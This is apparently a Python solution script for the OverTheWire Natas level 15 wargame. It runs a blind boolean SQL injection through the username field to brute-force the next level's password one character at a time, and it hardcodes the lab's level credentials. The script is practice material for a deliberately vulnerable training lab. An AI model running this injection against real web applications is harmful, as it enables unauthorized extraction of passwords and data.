#! /usr/bin/python3

import requests
import re
from string import ascii_uppercase,ascii_lowercase,digits

characters = ascii_uppercase + ascii_lowercase + digits

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
#seen_password = list('')
pass_search = ""

done = False

while(not done):
	for ch in characters:
		response = session.post(url,data={"username": 'natas16" AND BINARY password LIKE "' + pass_search + ch + '%" -- '}, auth=(username,password))
		content = response.text
		if('user exists' in content):
			#seen_password.append(ch)
			pass_search += ch
			break
	print("tryning: ", pass_search + ch)
	if len(pass_search) == 32:
		done = True



